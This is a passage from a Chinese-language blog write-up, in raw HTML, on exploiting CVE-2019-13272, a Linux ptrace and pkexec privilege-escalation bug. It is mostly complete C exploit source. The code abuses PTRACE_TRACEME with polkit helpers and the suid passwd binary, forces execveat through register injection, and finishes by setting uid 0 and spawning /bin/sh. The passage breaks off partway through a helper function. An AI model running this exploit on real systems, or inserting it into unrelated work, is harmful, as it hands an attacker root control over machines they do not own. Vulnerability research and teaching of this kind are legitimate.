class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">// in task A</span><br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-comment">// force the task B to execve stage2</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);<br>    forceChildToExecve(pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;stage2&quot;</span>);<br>    <span class="hljs-comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">// task again B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middleStage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> child = waitpid(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    forceChildToExecve(child, <span class="hljs-number">114</span>, <span class="hljs-string">&quot;stage3&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// task again C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了一个自行编写的 <code>forceChildToExecve()</code> 函数，主要是控制 ptracee 进程通过 execveat 系统调用执行回 exp 程序的不同入口，具体细节参见注释，这里不再赘叙</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// force a child to execve by ptrace through execveat syscall</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">forceChildToExecve</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> child_pid, <span class="hljs-type">int</span> exec_fd, <span class="hljs-type">char</span> *argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> <br>    &#123;<br>        .iov_base = &amp;regs,<br>        .iov_len = <span class="hljs-keyword">sizeof</span>(regs),<br>    &#125;;<br>    <span class="hljs-type">size_t</span> child_stack;<br>    <span class="hljs-type">size_t</span> insert_data[<span class="hljs-number">0x100</span>];<br><br>    ptrace(PTRACE_SYSCALL, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// wait for child meeting a syscall</span><br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// wait for child to execve</span><br>    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="hljs-comment">// get env of child</span><br>    <br>    <span class="hljs-comment">// prepare the stack data</span><br>    child_stack = (regs.rsp - <span class="hljs-number">0x1000</span>) &amp; ~<span class="hljs-number">0xfff</span>UL; <br>    <span class="hljs-built_in">memset</span>(insert_data, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(insert_data));<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = child_stack + <span class="hljs-number">0x18</span>;    <span class="hljs-comment">// argv arrays</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// env arrays</span><br>    insert_data[idx++] = *(<span class="hljs-type">size_t</span>*)argv;          <span class="hljs-comment">// argv[0]</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// path</span><br><br>    <span class="hljs-comment">// copy to child stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; idx; i++)<br>        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>), insert_data[i]);<br><br>    <span class="hljs-comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span><br>    regs.orig_rax = __NR_execveat;<br>    regs.rdi = exec_fd;<br>    regs.rsi = child_stack + <span class="hljs-number">0x20</span>;  <span class="hljs-comment">// path -&gt; NULL</span><br>    regs.rdx = child_stack;         <span class="hljs-comment">// argv -&gt; &quot;stagex&quot;, NULL</span><br>    regs.r10 = child_stack + <span class="hljs-number">0x10</span>;  <span class="hljs-comment">// envp -&gt; NULL</span><br>    regs.r8  = AT_EMPTY_PATH;       <span class="hljs-comment">// flags</span><br><br>    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);<br>    ptrace(PTRACE_DETACH, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Final-EXP">Final EXP</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/elf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *helper_list[] = <br>&#123;<br>    <span class="hljs-string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,<br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *helper = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *helper_basename = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> pipe_for_block[<span class="hljs-number">2</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> self_fd;<br><span class="hljs-type">pid_t</span> pid_task_b;<br><span class="hljs-type">pid_t</span> pid_task_c;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">findHelper</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">middleStage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">middlePtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">finalPtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">forceChildToExecve</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> child_pid, <span class="hljs-type">int</span> exec_fd, <span class="hljs-type">char</span> *argv)</span>;<br><br><span class="hljs-comment">// mainly for task a, and jmp for stage 2 and 3</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage2&quot;</span>))<br>        <span class="hljs-keyword">return</span> middleStage();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage3&quot;</span>))<br>        <span class="hljs-keyword">return</span> getRootShell();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Written by arttnba3.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start exploiting...&quot;</span>);<br><br>    <span class="hljs-comment">// find the helper</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Finding the helper...&quot;</span>);<br>    helper = findHelper();<br>    helper_basename = basename(helper);<br>    <span class="hljs-keyword">if</span> (!helper)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Using helper: %s\n&quot;</span>, helper);<br><br>    <span class="hljs-comment">// create the pipe for blocking child</span><br>    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="hljs-comment">// set the pipe in packet mode, which meant that the data should be received in packets</span><br>    fcntl(pipe_for_block[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>);<br>    write(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span><br><br>    <span class="hljs-comment">// fork out task B</span><br>    <span class="hljs-comment">// two kinds of writing, all OK</span><br>    <span class="hljs-comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span><br>    pid_task_b = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_b)<br>    &#123;<br>        middlePtracee();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> comm[<span class="hljs-number">0x100</span>];<br>        <span class="hljs-type">int</span> comm_fd = open(buf, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (comm_fd &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        comm[read(comm_fd, comm, <span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(comm, helper_basename, <span class="hljs-number">10</span>))<br>            <span class="hljs-keyword">break</span>;<br>        usleep(<span class="hljs-number">100000</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);<br>    ptrace(PTRACE_ATTACH, pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    waitpid(pid_task_b, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0 means no extra options</span><br><br>    <span class="hljs-comment">// force the task B to execve stage2</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);<br>    forceChildToExecve(pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;stage2&quot;</span>);<br>    <span class="hljs-comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">findHelper</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">buf</span>;</span><br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(helper_list) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!stat(helper_list[i], &amp;buf))<br>            <span class="hljs-keyword">return</span> helper_list[i];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// task B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middlePtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    self_fd = open(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">pw</span> =</span> getpwuid(getuid());<br>    pid_task_b = getpid();<br><br>    pid_task_c = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_c)<br>        <span class="hljs-keyword">return</span> finalPtracee();<br>    <br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    dup2(self_fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// got stdin close</span><br>    dup2(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); <span class="hljs-comment">// redirect stdout to block it</span><br>    execl(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>), <span class="hljs-string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="hljs-string">&quot;--helper&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrive there, we failed.</span><br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// task again B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middleStage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> child = waitpid(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    forceChildToExecve(child, <span class="hljs-number">114</span>, <span class="hljs-string">&quot;stage3&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// task C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">finalPtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    pid_task_c = getpid();<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> needle[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">char</span> uid_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> task_B_status_fd;<br><br>    <span class="hljs-built_in">sprintf</span>(needle, <span class="hljs-string">&quot;/proc/%d/status&quot;</span>, pid_task_b);<br>    <span class="hljs-built_in">sprintf</span>(uid_buf, <span class="hljs-string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());<br>    dup2(self_fd, <span class="hljs-number">114</span>);<br>    task_B_status_fd = open(needle, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (task_B_status_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">// check out uid of task B</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        buf[pread(task_B_status_fd, buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(buf, uid_buf)) <span class="hljs-comment">// task B got root</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// let task B(root) be ptracer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Task B is root now!&quot;</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);<br>    execl(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrived there, execve failed </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Task C failed to execve!&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// task again C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// force a child to execve by ptrace through execveat syscall</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">forceChildToExecve</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> child_pid, <span class="hljs-type">int</span> exec_fd, <span class="hljs-type">char</span> *argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> <br>    &#123;<br>        .iov_base = &amp;regs,<br>        .iov_len = <span class="hljs-keyword">sizeof</span>(regs),<br>    &#125;;<br>    <span class="hljs-type">size_t</span> child_stack;<br>    <span class="hljs-type">size_t</span> insert_data[<span class="hljs-number">0x100</span>];<br><br>    ptrace(PTRACE_SYSCALL, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// wait for child meeting a syscall</span><br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// wait for child to execve</span><br>    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="hljs-comment">// get env of child</span><br>    <br>    <span class="hljs-comment">// prepare the stack data</span><br>    child_stack = (regs.rsp - <span class="hljs-number">0x1000</span>) &amp; ~<span class="hljs-number">0xfff</span>UL; <br>    <span class="hljs-built_in">memset</span>(insert_data, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(insert_data));<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = child_stack + <span class="hljs-number">0x18</span>;    <span class="hljs-comment">// argv arrays</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// env arrays</span><br>    insert_data[idx++] = *(<span class="hljs-type">size_t</span>*)argv;          <span class="hljs-comment">// argv[0]</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// path</span><br><br>    <span 